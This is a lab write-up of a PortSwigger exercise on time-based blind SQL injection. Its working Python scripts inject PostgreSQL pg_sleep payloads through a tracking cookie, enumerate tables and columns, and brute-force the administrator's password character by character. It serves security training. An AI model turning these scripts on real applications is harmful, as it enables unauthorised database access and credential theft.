# Blind SQL injection with time delays and information retrieval

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval), you'll learn: Blind SQL injection with time delays and information retrieval! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020221208033626.png)

**In the previous labs, we found a blind SQL injection vulnerability in a tracking cookie, and it doesn't respond any different.**

**If there is no differences in the application's response**, like no error message, we can try to trigger a time delays. **This is so call a Time-Based SQL injection.**

**For the sake of automation, I'll write a python script:**
```py
#!/usr/bin/env python3

import requests
from time import time
import urllib.parse

def main():
    url = 'https://0a060068037c9abbc0653d2d00f40083.web-security-academy.net/'

    payload = """PAYLOAD_HERE"""
    finalPayload = urllib.parse.quote(payload)

    cookie = {
        'session': 'YOUR_SESSIONID',
        'TrackingId': finalPayload
    }

    startTime = time()
    requests.get(url, cookies=cookie)
    endTime = time()

    timeDifference = endTime - startTime

    print(f'[+] The request time difference is: {timeDifference:.2f}s')

if __name__ == '__main__':
    main()
```

**Now, we can try different kinds of time -based SQL injection payloads.** (From [PortSwigger's SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet))

**Eventually you'll find 1 payload works:**
```py
payload = """'; SELECT pg_sleep(5)--"""
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
└─# python3 exploit.py
[+] The request time difference is: 5.94s
```

We can confirm that it's using **PostgreSQL** to process the query.

**Next, we can use the conditional time delays to enumerate much deeper:** (From [PortSwigger's SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet))

```py
# Payload 1:
payload = """';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"""

# Payload 2:
payload = """';SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END--"""
```

```
# Payload 1:
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
└─# python3 exploit.py
[+] The request time difference is: 5.96s

# Payload 2:
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
└─# python3 exploit.py
[+] The request time difference is: 0.92s
```

**As you can see, if the `CASE` expression evaluates a `True` boolean value, it sleeps for 5 seconds, otherwise no sleep.**

**Armed with above information, we can enumerate table names via a wordlist of common table names:**
```py
#!/usr/bin/env python3

import requests
from time import time
import urllib.parse

def readFile(filePath):
    listWordlist = list()
    # Try to grab a common table names wordlist
    try:
        with open(filePath, 'r') as file:
            for line in file:
                wordlistRawData = line.strip().split('\n')

                # Clean all unnecessary comments, empty lists. Then append them to a list
                if wordlistRawData == [''] or '#' in wordlistRawData[0]:
                    continue
                else:
                    listWordlist.append(wordlistRawData)
        return listWordlist 
    except:
        print('[-] Couldn\'t read the file...')

def main(listWordlist, sessionId):
    url = 'https://0a060068037c9abbc0653d2d00f40083.web-security-academy.net/'
    # Send the payload
    try:
        for tableName in listWordlist:
            print(f'[*] Trying table: {tableName[0]:^20s}', end='\r')
            payload = f"""';SELECT CASE WHEN (table_name='{tableName[0]}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM information_schema.tables--"""
            finalPayload = urllib.parse.quote(payload)

            cookie = {
                'session': sessionId,
                'TrackingId': finalPayload
            }

            startTime = time()
            requests.get(url, cookies=cookie)
            endTime = time()

            timeDifference = endTime - startTime

            if timeDifference >= 3:
                print(f'[+] Found table: {tableName[0]:^20s}')
                # print(f'[+] The request time difference is: {timeDifference:.2f}s')
    except KeyboardInterrupt:
        print('\n[*] Bye!')

if __name__ == '__main__':
    # Wordlist from sqlmap (GitHub: https://raw.githubusercontent.com/drtychai/wordlists/master/sqlmap/common-tables.txt)
    filePath = '/usr/share/sqlmap/data/txt/common-tables.txt'

    listWordlist = readFile(filePath)

    sessionId = 'YOUR_SESSIONID'
    main(listWordlist, sessionId)
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
└─# python3 exploit.py
[+] Found table:        users
```

Nice, we found a table called `users`.

**Let's enumerate column names of `users` table:**
```py
#!/usr/bin/env python3

import requests
from time import time
import urllib.parse

def readFile(filePath):
    listWordlist = list()
    # Try to grab a common table names wordlist
    try:
        with open(filePath, 'r') as file:
            for line in file:
                wordlistRawData = line.strip().split('\n')

                # Clean all unnecessary comments, empty lists. Then append them to a list
                if wordlistRawData == [''] or '#' in wordlistRawData[0]:
                    continue
                else:
                    listWordlist.append(wordlistRawData)
        return listWordlist 
    except:
        print('[-] Couldn\'t read the file...')

def main(listWordlist, sessionId):
    url = 'https://0a060068037c9abbc0653d2d00f40083.web-security-academy.net/'
    # Send the payload
    try:
        for columnName in listWordlist:
            print(f'[*] Trying column: {columnName[0]:^20s}', end='\r')
            payload = f"""';SELECT CASE WHEN (column_name='{columnName[0]}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM information_schema.columns WHERE table_name='users'--"""
            finalPayload = urllib.parse.quote(payload)

            cookie = {
                'session': sessionId,
                'TrackingId': finalPayload
            }

            startTime = time()
            requests.get(url, cookies=cookie)
            endTime = time()

            timeDifference = endTime - startTime

            if timeDifference >= 3:
                print(f'[+] Found column: {columnName[0]:^20s}')
                # print(f'[+] The request time difference is: {timeDifference:.2f}s')
    except KeyboardInterrupt:
        print('\n[*] Bye!')

if __name__ == '__main__':
    # Wordlist from sqlmap (GitHub: https://raw.githubusercontent.com/drtychai/wordlists/master/sqlmap/common-columns.txt)
    filePath = '/usr/share/sqlmap/data/txt/common-columns.txt'

    listWordlist = readFile(filePath)

    sessionId = 'YOUR_SESSIONID'
    main(listWordlist, sessionId)
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
└─# python3 exploit.py
[+] Found column:       username       
[+] Found column:       password
```

- Found columns: `username` and `password`. 

**Moreover, we can find the length of the first row in `username` and `password` column:**
```py
#!/usr/bin/env python3

import requests
from time import time
import urllib.parse

def main(sessionId):
    url = 'https://0a060068037c9abbc0653d2d00f40083.web-security-academy.net/'
    
    # Send the payload
    payload = f"""PAYLOAD_HERE"""
    finalPayload = urllib.parse.quote(payload)

    cookie = {
        'session': sessionId,
        'TrackingId': finalPayload
    }

    startTime = time()
    requests.get(url, cookies=cookie)
    endTime = time()

    timeDifference = endTime - startTime

    print(f'[+] The request time difference is: {timeDifference:.2f}s')

if __name__ == '__main__':
    sessionId = 'YOUR_SESSIONID'

    main(sessionId)
```

- **Column `username`:**

```py
# Payload 1:
payload = f"""';SELECT CASE WHEN (LENGTH(username) > 12) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users LIMIT 1--"""

# Payload 2:
payload = f"""';SELECT CASE WHEN (LENGTH(username) > 13) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users LIMIT 1--"""
```

```
# Payload 1:
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
└─# python3 exploit.py
[+] The request time difference is: 3.90s

# Payload 2:
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
└─# python3 exploit.py
[+] The request time difference is: 0.91s
```

- **Found the length of the first row in column `username` is 13.**

- **Column `password`:**

```py
# Payload 1:
payload = f"""';SELECT CASE WHEN (LENGTH(password) > 19) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users LIMIT 1--"""

# Payload 2:
payload = f"""';SELECT CASE WHEN (LENGTH(password) > 20) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users LIMIT 1--"""
```

```
# Payload 1:
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
└─# python3 exploit.py
[+] The request time difference is: 3.93s

# Payload 2:
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
└─# python3 exploit.py
[+] The request time difference is: 0.92s
```

- **Found the length of the first row in column `password` is 20.**

**Armed with above information, we can finally brute force the first row data in `username` and `password` column:**

- **Column `username`:**

```py
#!/usr/bin/env python3

import requests
from time import time
import urllib.parse
from string import ascii_lowercase, digits

def main(sessionId, chars):
    url = 'https://0a060068037c9abbc0653d2d00f40083.web-security-academy.net/'
    # Send the payload
    username = ''
    position = 1

    try:
        while True:
            for characters in chars:                
                payload = f"""';SELECT CASE WHEN (SUBSTRING(username,{position},1)='{characters}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users LIMIT 1--"""
                finalPayload = urllib.parse.quote(payload)

                cookie = {
                    'session': sessionId,
                    'TrackingId': finalPayload
                }

                startTime = time()
                requests.get(url, cookies=cookie)
                endTime = time()

                timeDifference = endTime - startTime

                if timeDifference >= 3:
                    position += 1
                    username += characters
                    print(f'[+] Found username characters: {username}', end='\r')
                    break
                    # print(f'[+] The request time difference is: {timeDifference:.2f}s')

            if len(username) >= 13:
                print(f'\n[+] Found username: {username}')
                exit()

    except KeyboardInterrupt:
        print('\n[*] Bye!')

if __name__ == '__main__':
    chars = ascii_lowercase + digits
    sessionId = 'YOUR_SESSIONID'

    main(sessionId, chars)
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
└─# python3 exploit.py
[+] Found username characters: administrator
[+] Found username: administrator
```

- **Found username: `administrator`**

- **Column `password`:**

```py
#!/usr/bin/env python3

import requests
from time import time
import urllib.parse
from string import ascii_lowercase, digits

def main(sessionId, chars):
    url = 'https://0a060068037c9abbc0653d2d00f40083.web-security-academy.net/'
    # Send the payload
    password = ''
    position = 1

    try:
        while True:
            for characters in chars:                
                payload = f"""';SELECT CASE WHEN (SUBSTRING(password,{position},1)='{characters}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users LIMIT 1--"""
                finalPayload = urllib.parse.quote(payload)

                cookie = {
                    'session': sessionId,
                    'TrackingId': finalPayload
                }

                startTime = time()
                requests.get(url, cookies=cookie)
                endTime = time()

                timeDifference = endTime - startTime

                if timeDifference >= 3:
                    position += 1
                    password += characters
                    print(f'[+] Found password characters: {password}', end='\r')
                    break
                    # print(f'[+] The request time difference is: {timeDifference:.2f}s')

            if len(password) >= 20:
                print(f'\n[+] Found password: {password}')
                exit()

    except KeyboardInterrupt:
        print('\n[*] Bye!')

if __name__ == '__main__':
    chars = ascii_lowercase + digits
    sessionId = 'YOUR_SESSIONID'

    main(sessionId, chars)
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-13]
└─# python3 exploit.py
[+] Found password characters: 0jzprs1pqo19ewylpckp
[+] Found password: 0jzprs1pqo19ewylpckp
```

- **Found `administrator` password: `0jzprs1pqo19ewylpckp`**

**Finally, armed with above information, we can login as `administrator`!!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020221208062409.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020221208062422.png)

**We're `administrator`!**

# What we've learned:

1. Blind SQL injection with time delays and information retrieval